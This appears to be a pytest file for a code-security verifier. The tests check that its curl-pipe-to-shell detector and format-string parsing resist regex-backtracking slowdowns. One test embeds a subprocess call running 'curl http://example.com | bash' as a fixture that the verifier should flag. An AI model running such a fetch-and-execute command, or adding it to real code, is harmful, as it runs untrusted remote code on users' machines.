"""The subprocess curl/pipe/shell detector must stay linear: the old chained
`.*?` regex backtracked catastrophically on non-matching input and could freeze
the single-worker API (OpenVuln run-3, issue #445)."""
import time

from qwed_new.core.code_verifier import CodeVerifier


def _detector_time(verifier, reps):
    # Worst case for a rescan-per-match detector: many subprocess matches, with
    # the only shell token at the very end so every match must look past them all.
    code = "subprocess.run(curl a|" * reps + "bash"
    start = time.perf_counter()
    verifier._check_remote_pipe_to_shell(code)
    return time.perf_counter() - start


def test_detector_scales_near_linearly():
    verifier = CodeVerifier()
    _detector_time(verifier, 2000)  # warm up
    small = _detector_time(verifier, 20000)
    large = _detector_time(verifier, 40000)
    # Doubling the input must not blow up: a quadratic detector would be ~4x or
    # worse. A generous bound catches a superlinear regression without flaking.
    assert large < small * 2.5 + 0.2, f"detector scaled {large / max(small, 1e-6):.1f}x on 2x input"


def test_non_matching_subprocess_input_stays_fast():
    verifier = CodeVerifier()
    # Integration coverage: the public path handles the worst-case fragment
    # quickly (the old chained-regex froze here). Each fragment is a string
    # literal, so the code parses and every check runs on it (#534).
    code = '"subprocess.run(curl a|"\n' * 4000
    start = time.perf_counter()
    result = verifier.verify_code(code, language="python")
    assert time.perf_counter() - start < 2.0
    # subprocess. is still CRITICAL via process execution.
    assert result.developer_fields["critical_count"] >= 1


def test_unparseable_worst_case_fragment_is_blocked_fast():
    verifier = CodeVerifier()
    code = "subprocess.run(curl a|" * 4000
    start = time.perf_counter()
    result = verifier.verify_code(code, language="python")
    assert time.perf_counter() - start < 2.0
    assert result.status.value == "BLOCKED"
    assert result.developer_fields["constraint_id"] == "code_verifier.parse_error"


def test_growing_literal_reshape_is_not_worked_out():
    # The #534 string check works out what a literal reshape leaves, but not
    # a translate or a replace that grows the text: worked out, these build
    # a string of about n * n characters.
    verifier = CodeVerifier()
    n = 10000
    for code in (
        'x = "' + "q" * n + '".translate({113: "' + "a" * n + '"})',
        'x = "' + "q" * n + '".replace("q", "' + "a" * n + '")',
    ):
        start = time.perf_counter()
        verifier.verify_code(code, language="python")
        assert time.perf_counter() - start < 0.5


def test_unclosed_format_keys_stay_fast():
    # A regex for %-conversions backtracked quadratically on "%(" with no
    # closing parenthesis, and on a long run of zeros (flag or width) with no
    # conversion type; the format reader makes one pass.
    verifier = CodeVerifier()
    for literal in ("%(" * 100000, "%" + "0" * 200000, "%0" * 100000):
        start = time.perf_counter()
        verifier.verify_code('x = "' + literal + '" % values', language="python")
        assert time.perf_counter() - start < 1.0


def test_names_reshaped_many_times_stay_fast():
    # Each name is worked out once, not once per reshape of it.
    n = 3000
    code = "".join(f's = "{i}"\n' for i in range(n)) + "x = s[1:]\n" * n + "y = s % v\n" * n
    start = time.perf_counter()
    CodeVerifier().verify_code(code, language="python")
    assert time.perf_counter() - start < 2.0


def test_curl_pipe_shell_still_flagged_across_lines():
    verifier = CodeVerifier()
    code = (
        "import subprocess\n"
        "subprocess.run(\n"
        '    "curl http://example.com | bash",\n'
        "    shell=True,\n"
        ")\n"
    )
    result = verifier.verify_code(code, language="python")
    issues = result.developer_fields["issues"]
    assert any(i["type"] == "remote_code_execution" for i in issues)
